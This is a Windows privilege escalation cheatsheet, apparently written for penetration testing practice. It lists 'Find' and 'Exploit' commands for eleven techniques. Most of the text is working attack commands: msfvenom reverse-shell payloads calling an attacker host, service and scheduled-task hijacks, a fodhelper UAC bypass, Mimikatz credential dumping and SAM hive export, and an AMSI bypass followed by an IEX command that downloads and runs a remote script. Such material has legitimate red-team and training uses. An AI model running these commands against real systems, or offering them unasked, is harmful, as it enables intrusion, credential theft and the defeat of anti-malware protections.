# Windows Privesc Exploitation Cheatsheet

This cheatsheet provides the specific "Find" and "Exploit" commands for the 11 Windows privilege escalation techniques.

---

### ## 1. Enumeration / Basic Commands

The goal of enumeration is to gather intelligence for other exploits. The "exploit" is the act of gathering the data.

* **Exploit Commands:**
    ```powershell
    rem -- Check user, groups, and privileges
    whoami /all

    rem -- Get OS and patch info for kernel exploits
    systeminfo

    rem -- Find interesting running services
    tasklist /SVC

    rem -- Automatically find low-hanging fruit
    .\winPEASx64.exe -quiet
    ```

---

### ## 2. Weak Service Permissions

Hijack a service your user has permission to modify.

* **Find:**
    ```powershell
    accesschk.exe /accepteula -uwcqv "Users" *
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Reconfigure the service's binary to your payload
    sc config <VulnSvc> binPath= "C:\tmp\payload.exe"

    rem -- Restart the service to execute the payload as SYSTEM
    sc stop <VulnSvc>
    sc start <VulnSvc>
    ```

---

### ## 3. Unquoted Service Paths

Exploit a service path with spaces that is not enclosed in quotes.

* **Find:**
    ```powershell
    wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Create a malicious executable named after the first part of the path
    rem -- e.g., for "C:\Program Files\App\vuln.exe", name it "Program.exe"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o Program.exe

    rem -- Place the payload in the higher-level path and restart the service
    copy Program.exe "C:\"
    sc stop <VulnSvc>
    sc start <VulnSvc>
    ```

---

### ## 4. SeImpersonate / SeAssignPrimaryToken Privilege Escalation

Abuse token impersonation privileges to become **SYSTEM**.

* **Find:**
    ```powershell
    whoami /priv
    ```
* **Exploit Command:**
    ```powershell
    rem -- Use a tool like PrintSpoofer to get a SYSTEM shell
    PrintSpoofer.exe -i -c "cmd.exe"
    ```

---

### ## 5. DLL Hijacking

Load a malicious DLL into a privileged application.

* **Find:** Use **ProcMon.exe** to find `NAME NOT FOUND` errors for `.dll` files.
* **Exploit Commands:**
    ```powershell
    rem -- Create a malicious DLL with the same name as the missing one
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f dll -o vulnerable.dll

    rem -- Place it in the writable directory and restart the application
    copy vulnerable.dll "C:\Path\To\Writable\Folder\"
    ```

---

### ## 6. Sensitive Files & Hashes (SAM/LSA Secrets)

Extract credentials from files or memory.

* **Find:**
    ```powershell
    rem -- Search for passwords in common config files
    dir /s /b *unattended*.xml *web.config* *pass*.txt
    ```
* **Exploit Commands (Requires Admin):**
    ```powershell
    rem -- Dump hashes from LSA memory with Mimikatz
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

    rem -- Dump SAM and SYSTEM hives for offline cracking
    reg save hklm\sam C:\tmp\sam.save
    reg save hklm\system C:\tmp\system.save
    ```

---

### ## 7. Windows Vault / Credential Manager

Retrieve credentials saved by users.

* **Exploit Commands:**
    ```powershell
    rem -- List all credentials stored in the vault
    cmdkey /list

    rem -- Dump vault credentials with Mimikatz
    mimikatz.exe "vault::cred" exit
    ```

---

### ## 8. Scheduled Tasks

Hijack a privileged task that points to a writable file.

* **Find:**
    ```powershell
    rem -- List tasks and then check permissions on the target binary
    schtasks /query /fo LIST /v
    icacls "C:\Path\To\TaskBinary.exe"
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Overwrite the writable binary with your payload
    rem -- The original binary will be replaced. The task will run your payload on its next trigger.
    copy /Y C:\tmp\payload.exe "C:\Path\To\TaskBinary.exe"
    ```

---

### ## 9. AlwaysInstallElevated

Install an MSI package with **SYSTEM** privileges.

* **Find:**
    ```powershell
    rem -- Check if both registry keys are set to 1
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Create a malicious MSI installer
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o payload.msi

    rem -- Run the installer on the target machine with no admin rights needed
    msiexec /quiet /qn /i C:\tmp\payload.msi
    ```

---

### ## 10. UAC Bypass

Elevate from a medium-integrity shell to a high-integrity shell.

* **Find:** Check UAC settings and the Windows build number.
* **Exploit Command (Example using fodhelper):**
    ```powershell
    rem -- Hijack the registry key that fodhelper.exe reads from
    reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\tmp\payload.exe" /f

    rem -- Execute fodhelper.exe to trigger the payload in a high-integrity context
    fodhelper.exe
    ```

---

### ## 11. AMSI Bypass

Disable anti-malware scanning for your current PowerShell session.

* **Exploit Command:**
    ```powershell
    rem -- Run this command first in your PowerShell session
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

    rem -- Now you can run enumeration scripts like PowerUp without being blocked
    IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1'); Invoke-AllChecks
    ```
